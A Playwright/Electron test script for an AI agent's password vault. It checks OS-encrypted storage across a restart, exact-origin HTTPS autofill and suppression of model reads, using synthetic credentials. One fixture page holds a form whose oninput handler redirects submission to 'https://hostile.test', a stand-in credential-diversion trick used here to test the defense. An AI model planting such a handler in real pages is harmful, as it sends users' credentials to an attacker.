// Synthetic HTTPS/browser and real OS-storage restart acceptance; no live account or model calls.
import { _electron as electron } from '@playwright/test';
import { build } from 'esbuild';
import { mkdtemp, writeFile, rm, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { createServer } from 'node:https';
import { generateKeyPairSync, sign, createHash } from 'node:crypto';
import assert from 'node:assert/strict';
const home = await mkdtemp(join(tmpdir(), 'step-vault-electron-'));
// A generated one-use certificate, trusted only by this isolated test app and origin.
const der = (tag, value) => {
  const b = Buffer.isBuffer(value) ? value : Buffer.from(value);
  const length =
    b.length < 128
      ? Buffer.from([b.length])
      : (() => {
          const bytes = [];
          let n = b.length;
          while (n) {
            bytes.unshift(n & 255);
            n >>= 8;
          }
          return Buffer.from([128 + bytes.length, ...bytes]);
        })();
  return Buffer.concat([Buffer.from([tag]), length, b]);
};
const seq = (...items) => der(0x30, Buffer.concat(items));
const algorithm = Buffer.from('300d06092a864886f70d01010b0500', 'hex');
const pair = generateKeyPairSync('rsa', { modulusLength: 2048 });
const name = seq(der(0x31, seq(Buffer.from('0603550403', 'hex'), der(0x0c, 'synthetic.local'))));
const validity = seq(der(0x17, '240101000000Z'), der(0x17, '300101000000Z'));
const extensions = der(0xa3, seq(seq(Buffer.from('0603551d11', 'hex'), der(0x04, seq(der(0x87, Buffer.from([127, 0, 0, 1])))))));
const tbs = seq(
  der(0xa0, der(0x02, Buffer.from([2]))),
  der(0x02, Buffer.from([1])),
  algorithm,
  name,
  validity,
  name,
  pair.publicKey.export({ type: 'spki', format: 'der' }),
  extensions,
);
const certDer = seq(tbs, algorithm, der(0x03, Buffer.concat([Buffer.from([0]), sign('RSA-SHA256', tbs, pair.privateKey)])));
const cert =
  '-----BEGIN CERTIFICATE-----\n' +
  certDer
    .toString('base64')
    .match(/.{1,64}/g)
    .join('\n') +
  '\n-----END CERTIFICATE-----\n';
const fingerprint = createHash('sha256').update(certDer).digest('hex').toUpperCase().match(/../g).join(':');
let app;
const server = createServer({ key: pair.privateKey.export({ type: 'pkcs8', format: 'pem' }), cert }, (req, res) => {
  res.setHeader('content-type', 'text/html');
  if (req.url === '/two') res.end('<form method="post"><input name="username" autocomplete="username"><button>Next</button></form>');
  else if (req.url === '/changed')
    res.end(
      '<form method="post"><input name="username" oninput="this.form.action=\'https://hostile.test\'"><input type="password"></form>',
    );
  else
    res.end(
      '<form method="post"><input name="username" autocomplete="username"><input type="password" autocomplete="current-password"><button>Login</button></form>',
    );
});
const env = { ...process.env };
delete env.ELECTRON_RUN_AS_NODE;
let phase = 'fixture setup';
const checkpoint = name => {
  phase = name;
  console.log(`Vault Electron phase: ${name}`);
};
// Native evaluate/close calls have no default deadline; a stall must report its phase and fail.
const deadline = setTimeout(() => {
  console.error(`Vault Electron timed out during ${phase}`);
  process.exitCode = 1;
  app?.process().kill('SIGKILL');
}, 90_000);
deadline.unref();
try {
  await new Promise(done => server.listen(0, '127.0.0.1', done));
  const origin = 'https://127.0.0.1:' + server.address().port;
  const bundle = join(home, 'vault.cjs'),
    browserBundle = join(home, 'browser.cjs'),
    entry = join(home, 'main.cjs');
  await build({ entryPoints: [resolve('electron/vault.ts')], outfile: bundle, bundle: true, platform: 'node', format: 'cjs' });
  await build({
    entryPoints: [resolve('electron/browser-agent.ts')],
    outfile: browserBundle,
    bundle: true,
    platform: 'node',
    format: 'cjs',
    external: ['electron'],
  });
  await writeFile(
    entry,
    `const {app,BrowserWindow,safeStorage}=require('electron');globalThis.fixtureErrors=[];app.on('web-contents-created',(event,w)=>w.on('did-fail-load',(event,code)=>globalThis.fixtureErrors.push(code)));globalThis.fixtureErrors=[];app.on('web-contents-created',(event,w)=>w.on('did-fail-load',(event,code)=>globalThis.fixtureErrors.push(code)));const {Vault}=require(${JSON.stringify(bundle)});globalThis.AgentBrowser=require(${JSON.stringify(browserBundle)}).AgentBrowser;app.setPath('userData',${JSON.stringify(join(home, 'profile'))});app.on('certificate-error',(event,contents,url,error,certificate,callback)=>{globalThis.fixtureErrors.push([error,certificate.fingerprint]);globalThis.fixtureErrors.push([error,certificate.fingerprint]);if(new URL(url).origin===${JSON.stringify(origin)}&&require('crypto').createHash('sha256').update(new (require('crypto').X509Certificate)(certificate.data).raw).digest('hex').toUpperCase()===${JSON.stringify(fingerprint.replaceAll(':', ''))}){event.preventDefault();callback(true);}else callback(false);});app.whenReady().then(()=>{globalThis.vault=new Vault(${JSON.stringify(join(home, 'vault.sqlite'))},{wrap:s=>{if(!safeStorage.isEncryptionAvailable())throw Error('OS_STORAGE_UNAVAILABLE');return safeStorage.encryptString(s)},unwrap:b=>safeStorage.decryptString(b)});const w=new BrowserWindow({show:false});w.loadURL('about:blank');});app.on('will-quit',()=>globalThis.vault.close());`,
  );
  checkpoint('launch storage fixture');
  app = await electron.launch({ args: [entry], env, timeout: 45000 });
  await app.firstWindow();
  const saved = await app.evaluate(
    (_electron, origin) =>
      globalThis.vault.save({
        label: 'fixture',
        kind: 'website',
        destination: origin,
        username: 'synthetic-user',
        password: 'synthetic-password',
      }),
    origin,
  );
  assert.equal(Object.hasOwn(saved, 'password'), false);
  checkpoint('close first process');
  await app.close();
  app = undefined;
  // Same profile, separate Electron process: this exercises actual safeStorage, not mock encryption.
  checkpoint('restart storage fixture');
  app = await electron.launch({ args: [entry], env, timeout: 45000 });
  await app.firstWindow();
  await app.evaluate(() => {
    globalThis.agent = new globalThis.AgentBrowser(undefined, () => ['127.0.0.1']);
    globalThis.context = {
      sessionId: 'owner',
      signal: new AbortController().signal,
      check: async () => {},
      approve: async () => true,
      review: () => {},
    };
  });
  const open = url =>
    app
      .evaluate(
        async (_electron, url) =>
          globalThis.agent.run({ tool: 'browser_control', input: url, args: { action: 'open' } }, globalThis.context),
        url,
      )
      .catch(async error => {
        console.log(await app.evaluate(() => globalThis.fixtureErrors));
        throw error;
      });
  const page = await open(origin + '/login');
  checkpoint('exact-origin fill');
  const result = await app.evaluate(async (_electron, id) => {
    const expected = await globalThis.agent.prepareVault(id, 'owner', globalThis.context.signal);
    const [credential] = globalThis.vault.catalog('owner', expected.origin);
    return globalThis.vault.fill(
      credential.handle,
      'owner',
      expected.origin,
      async () => true,
      payload => globalThis.agent.fillVault(id, 'owner', expected, payload, globalThis.context.signal),
    );
  }, page.tab);
  assert.deepEqual(result.filledFields, ['username', 'password']);
  assert.equal(result.status, 'filled');
  const hidden = await app.evaluate(
    async (_electron, id) =>
      globalThis.agent.run({ tool: 'browser_control', input: id, args: { action: 'read' } }, globalThis.context).then(
        () => false,
        e => e.message,
      ),
    page.tab,
  );
  assert.equal(hidden, 'BROWSER_VAULT_SENSITIVE');
  await app.evaluate(() => globalThis.agent.closeOwner('owner'));
  const changed = await open(origin + '/changed');
  checkpoint('changed-form partial fill');
  const partial = await app.evaluate(async (_electron, id) => {
    const expected = await globalThis.agent.prepareVault(id, 'owner', globalThis.context.signal);
    const [credential] = globalThis.vault.catalog('owner', expected.origin);
    return globalThis.vault.fill(
      credential.handle,
      'owner',
      expected.origin,
      async () => true,
      payload => globalThis.agent.fillVault(id, 'owner', expected, payload, globalThis.context.signal),
    );
  }, changed.tab);
  assert.equal(partial.status, 'partial');
  assert.deepEqual(partial.filledFields, ['username']);
  await app.evaluate(() => globalThis.agent.closeOwner('owner'));
  const single = await open(origin + '/two');
  checkpoint('identifier-only fill');
  const one = await app.evaluate(async (_electron, id) => {
    const expected = await globalThis.agent.prepareVault(id, 'owner', globalThis.context.signal);
    const [credential] = globalThis.vault.catalog('owner', expected.origin);
    return globalThis.vault.fill(
      credential.handle,
      'owner',
      expected.origin,
      async () => true,
      payload => globalThis.agent.fillVault(id, 'owner', expected, payload, globalThis.context.signal),
    );
  }, single.tab);
  assert.deepEqual(one.filledFields, ['username']);
  checkpoint('close owned browser views');
  await app.evaluate(() => globalThis.agent.closeOwner('owner'));
  await mkdir('release/qa/vault', { recursive: true });
  console.log(
    'Vault Electron smoke passed: actual OS encryption across restart, HTTPS exact-origin fill, identifier-only login, changed form partial outcome and model-read suppression.',
  );
} finally {
  checkpoint('close application');
  if (app) await app.close();
  checkpoint('close HTTPS fixture');
  server.closeAllConnections();
  await new Promise(done => server.close(done));
  checkpoint('remove private fixture');
  assert.ok(home.startsWith(tmpdir()));
  await rm(home, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  clearTimeout(deadline);
}
